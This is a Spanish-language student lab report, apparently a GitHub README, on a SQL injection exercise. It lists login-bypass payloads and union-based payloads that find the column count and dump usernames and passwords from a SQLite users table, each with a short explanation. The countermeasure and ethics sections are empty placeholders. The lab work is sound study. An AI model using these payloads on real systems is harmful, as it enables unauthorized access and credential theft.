# Laboratorio SQL Injection - Análisis de Vulnerabilidades
## Información del Equipo
- **Integrante 1:** Keiner Astos - KeinerAstos
- **Integrante 2:** Sebastian Gil - [Usuario GitHub]
- **Fecha:** 25/9/2025
## 1. Instalación y Configuración
[Instrucciones actualizadas para instalar el laboratorio]
## 2. Vulnerabilidades Identificadas
### 2.1 Login Bypass
**Payload utilizado:**
#### 1. Basico 
##### Usuario
```sql
admin ' -- #usuario
```
##### Contraseña - password
```sql
keiner123 ' -- #contraseña
```
![alt text](image.png)

al momento de realizar la inyeccion en usuario lo que esta haciendo el codigo es comentar lo que sigue a continuacion dentro de la consulta sql, elminando la contraseña como condición para acceder

#### 2. Basico
##### Usuario
```sql
user1' OR '1'='1
```
##### Contraseña - password
```sql
sebastian ' -- #contraseña
```
![alt text](image-1.png)
dentro de esta consulta lo que estamos haciendo es volver verdadera la condicion de sql comparando 1 = 1 con un or donde si el usuario existe ya va a dar verdadera la condición sin ningun problema para acceder

#### 3. Basico
##### Usuario
```sql
' OR 1=1 --
```
##### Contraseña - password
```sql
cualquiera ' -- #contraseña
```
![alt text](image-2.png)
retorna el primer usuario registrado en la base de datos, en este caso es admin y comenta lo que va despues del usuario con el fin de dar un true en el inicio de sesion y entrando con exito al perfil admin

#### 4. Otras pruebas
##### Usuario
```sql
admin'/*
```
##### Contraseña - password
```sql
*/OR/* -- #contraseña
```
lo que hace es comentar el bloque de sql haciendo un true en la validacion con la contraseña, donde se pone cualquiera de los usuarios que estan dentro de la base de datos

### 2.2 Union-Based Injection

#### 1. Detectar numero de columnas
##### Buscar producto
```sql
' ORDER BY 1 --
```
Nos muestra el numro de colmunas que tiene la tabla en el formato de busqueda, por lo que podemos inferir que tienen 6 colmunas la tabla ya que eso es lo que nos muestra la hacer la consulta.

![alt text](image-3.png)
#### 2. Mostrar estructura de la tabla users
Cuando realizamos la siguinete consulta dentro del input nos deberia de mostrar la estructura de la tabla de users, pero nos esta devolviendo solamente el nombre de la tabla

```sql
' UNION SELECT 1,sql,2,3 FROM sqlite_master WHERE name='users' --
```
![alt text](image-4.png)
#### Consulta de datos 
Podemos identificar que al momento de poner las siguientes lineas de codigo dentro del input, nos esta devolviendo un query con toda la información de datos que se encuentran dentro de los usuarios
```sql
' UNION SELECT 1,GROUP_CONCAT(username||':'||password),3,4 FROM users --
```
![alt text](image-5.png)
esto es bastante importante a la hora de poder entrar a diferentes perfiles de los usuarios y adquirir informacion de la misma

#### Numero total de usuarios
```sql
' UNION SELECT COUNT(*),2,3,4 FROM users --
```
Ientificamos en el item 5 el resultado de la consulta
![alt text](image-6.png)

### 2.3 Blind SQL Injection

## 3. Técnicas de Explotación y Evidencias
[Screenshots y código de payloads utilizados]
## 4. Análisis de Impacto y Contramedidas
[Soluciones técnicas propuestas]
## 5. Reflexión Ética del Equipo
[Consideraciones sobre uso responsables]